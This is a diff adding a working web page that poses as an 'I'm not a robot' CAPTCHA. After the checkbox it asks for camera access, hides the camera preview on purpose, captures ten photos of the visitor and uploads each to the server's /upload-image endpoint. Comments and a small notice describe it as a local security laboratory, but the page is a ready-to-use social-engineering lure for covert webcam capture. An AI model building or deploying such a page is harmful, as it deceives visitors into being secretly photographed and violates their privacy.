@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Security Verification</title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #f5f7fa;
+            color: #202124;
+            font-family: Arial, sans-serif;
+        }
+
+        .card {
+            width: 430px;
+            max-width: 92%;
+            background: white;
+            border: 1px solid #dadce0;
+            border-radius: 12px;
+            padding: 32px;
+            box-shadow: 0 4px 18px rgba(0, 0, 0, .08);
+        }
+
+        .logo {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 25px;
+        }
+
+        h1 {
+            font-size: 24px;
+            margin: 0 0 10px;
+        }
+
+        .description {
+            color: #5f6368;
+            line-height: 1.5;
+            margin-bottom: 25px;
+        }
+
+        .verify-box {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 18px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            margin-bottom: 18px;
+        }
+
+        .verify-box input {
+            width: 22px;
+            height: 22px;
+        }
+
+        button {
+            width: 100%;
+            padding: 13px;
+            border: 0;
+            border-radius: 7px;
+            background: #1a73e8;
+            color: white;
+            font-size: 15px;
+            cursor: pointer;
+        }
+
+        button:disabled {
+            opacity: .55;
+            cursor: not-allowed;
+        }
+
+        /*
+         * Camera preview intentionally not displayed.
+         * The camera is still used only after explicit permission.
+         */
+        #camera {
+            display: none;
+        }
+
+        #canvas {
+            display: none;
+        }
+
+        #status {
+            margin-top: 18px;
+            color: #5f6368;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .progress-container {
+            display: none;
+            margin-top: 22px;
+        }
+
+        .progress-text {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            font-size: 13px;
+            color: #5f6368;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: #e8eaed;
+            border-radius: 20px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: #1a73e8;
+            transition: width .3s ease;
+        }
+
+        .capture-status {
+            margin-top: 12px;
+            font-size: 13px;
+            color: #5f6368;
+            text-align: center;
+        }
+
+        .notice {
+            margin-top: 20px;
+            padding: 12px;
+            background: #f1f3f4;
+            border-radius: 7px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+
+        .success {
+            color: #188038 !important;
+        }
+
+        .error {
+            color: #d93025 !important;
+        }
+    </style>
+</head>
+
+
+<body>
+
+<div class="card">
+
+    <div class="logo">
+        Security Verification
+    </div>
+
+    <h1>Verify you're human</h1>
+
+    <p class="description">
+        Complete the verification below to continue.
+    </p>
+
+
+    <div class="verify-box">
+
+        <input
+            type="checkbox"
+            id="robotCheck"
+            onchange="startVerification()">
+
+        <label for="robotCheck">
+            I'm not a robot
+        </label>
+
+    </div>
+
+
+    <button
+        id="cameraButton"
+        onclick="requestCamera()"
+        style="display:none;">
+        Continue Verification
+    </button>
+
+
+    <!--
+        Camera element exists for the local laboratory,
+        but its visual preview is intentionally disabled.
+    -->
+    <video
+        id="camera"
+        autoplay
+        playsinline>
+    </video>
+
+
+    <canvas id="canvas"></canvas>
+
+
+    <div id="status">
+        Verification required.
+    </div>
+
+
+    <div
+        id="progressContainer"
+        class="progress-container">
+
+        <div class="progress-text">
+
+            <span>
+                Security verification
+            </span>
+
+            <span id="progressCount">
+                0 / 10
+            </span>
+
+        </div>
+
+
+        <div class="progress-bar">
+
+            <div
+                id="progressFill"
+                class="progress-fill">
+            </div>
+
+        </div>
+
+
+        <div
+            id="captureStatus"
+            class="capture-status">
+
+            Preparing verification...
+
+        </div>
+
+    </div>
+
+
+    <div class="notice">
+
+        This local security laboratory uses the camera
+        only after permission is granted and performs
+        a 10-image test sequence.
+
+    </div>
+
+</div>
+
+
+<script>
+
+let cameraStream = null;
+
+
+/* ---------------------------------------
+   Verification checkbox
+--------------------------------------- */
+
+function startVerification() {
+
+    const check =
+        document.getElementById("robotCheck");
+
+    const button =
+        document.getElementById("cameraButton");
+
+    const status =
+        document.getElementById("status");
+
+
+    if (check.checked) {
+
+        button.style.display = "block";
+
+        status.textContent =
+            "Verification accepted. Continue to camera verification.";
+
+    } else {
+
+        button.style.display = "none";
+
+        status.textContent =
+            "Verification required.";
+
+    }
+}
+
+
+/* ---------------------------------------
+   Camera permission
+--------------------------------------- */
+
+async function requestCamera() {
+
+    const status =
+        document.getElementById("status");
+
+    const button =
+        document.getElementById("cameraButton");
+
+    const video =
+        document.getElementById("camera");
+
+    const progressContainer =
+        document.getElementById("progressContainer");
+
+
+    try {
+
+        cameraStream =
+            await navigator.mediaDevices.getUserMedia({
+                video: true,
+                audio: false
+            });
+
+
+        video.srcObject =
+            cameraStream;
+
+
+        button.disabled = true;
+
+
+        status.textContent =
+            "Camera permission granted. Starting verification...";
+
+
+        progressContainer.style.display =
+            "block";
+
+
+        await waitForVideo();
+
+
+        await captureSequence();
+
+
+    } catch (error) {
+
+        console.error(error);
+
+        status.textContent =
+            "Camera permission was denied or unavailable.";
+
+        status.classList.add("error");
+
+    }
+}
+
+
+/* ---------------------------------------
+   Wait for camera
+--------------------------------------- */
+
+function waitForVideo() {
+
+    const video =
+        document.getElementById("camera");
+
+
+    return new Promise(function(resolve) {
+
+        function checkVideo() {
+
+            if (
+                video.videoWidth > 0 &&
+                video.videoHeight > 0
+            ) {
+
+                resolve();
+
+                return;
+            }
+
+
+            requestAnimationFrame(checkVideo);
+        }
+
+
+        checkVideo();
+
+    });
+}
+
+
+/* ---------------------------------------
+   Capture 10 images
+--------------------------------------- */
+
+async function captureSequence() {
+
+    const status =
+        document.getElementById("status");
+
+    const progressFill =
+        document.getElementById("progressFill");
+
+    const progressCount =
+        document.getElementById("progressCount");
+
+    const captureStatus =
+        document.getElementById("captureStatus");
+
+
+    const totalPhotos = 10;
+
+
+    for (
+        let i = 1;
+        i <= totalPhotos;
+        i++
+    ) {
+
+        status.textContent =
+            "Security verification in progress...";
+
+
+        progressCount.textContent =
+            `${i} / ${totalPhotos}`;
+
+
+        progressFill.style.width =
+            `${(i / totalPhotos) * 100}%`;
+
+
+        captureStatus.textContent =
+            `Capturing test image ${i} of ${totalPhotos}...`;
+
+
+        const success =
+            await capturePhoto(i);
+
+
+        if (!success) {
+
+            status.textContent =
+                `Verification stopped at image ${i}.`;
+
+            status.classList.add("error");
+
+            captureStatus.textContent =
+                "Image transfer failed.";
+
+            stopCamera();
+
+            return;
+        }
+
+
+        if (i < totalPhotos) {
+
+            await new Promise(
+                resolve =>
+                    setTimeout(resolve, 1000)
+            );
+
+        }
+
+    }
+
+
+    progressFill.style.width = "100%";
+
+    progressCount.textContent =
+        "10 / 10";
+
+
+    captureStatus.textContent =
+        "All test images captured successfully.";
+
+
+    status.textContent =
+        "Security verification completed successfully.";
+
+
+    status.classList.remove("error");
+
+    status.classList.add("success");
+
+
+    stopCamera();
+}
+
+
+/* ---------------------------------------
+   Capture single image
+--------------------------------------- */
+
+function capturePhoto(number) {
+
+    const video =
+        document.getElementById("camera");
+
+    const canvas =
+        document.getElementById("canvas");
+
+
+    if (!cameraStream) {
+
+        return Promise.resolve(false);
+
+    }
+
+
+    canvas.width =
+        video.videoWidth;
+
+
+    canvas.height =
+        video.videoHeight;
+
+
+    const context =
+        canvas.getContext("2d");
+
+
+    context.drawImage(
+        video,
+        0,
+        0,
+        canvas.width,
+        canvas.height
+    );
+
+
+    return new Promise(function(resolve) {
+
+        canvas.toBlob(
+
+            async function(blob) {
+
+                if (!blob) {
+
+                    resolve(false);
+
+                    return;
+
+                }
+
+
+                try {
+
+                    const response =
+                        await fetch(
+                            "/upload-image",
+                            {
+                                method: "POST",
+
+                                headers: {
+                                    "Content-Type":
+                                        "image/jpeg"
+                                },
+
+                                body: blob
+                            }
+                        );
+
+
+                    const result =
+                        await response.json();
+
+
+                    if (result.success) {
+
+                        console.log(
+                            `Image ${number} saved:`,
+                            result.path
+                        );
+
+                        resolve(true);
+
+                    } else {
+
+                        console.error(result);
+
+                        resolve(false);
+
+                    }
+
+
+                } catch (error) {
+
+                    console.error(error);
+
+                    resolve(false);
+
+                }
+
+            },
+
+            "image/jpeg",
+
+            0.90
+
+        );
+
+    });
+}
+
+
+/* ---------------------------------------
+   Stop camera
+--------------------------------------- */
+
+function stopCamera() {
+
+    if (!cameraStream) {
+        return;
+    }
+
+
+    cameraStream
+        .getTracks()
+        .forEach(function(track) {
+
+            track.stop();
+
+        });
+
+
+    cameraStream = null;
+
+
+    const video =
+        document.getElementById("camera");
+
+
+    video.srcObject = null;
+}
+
+</script>
+
+</body>
+
+</html>
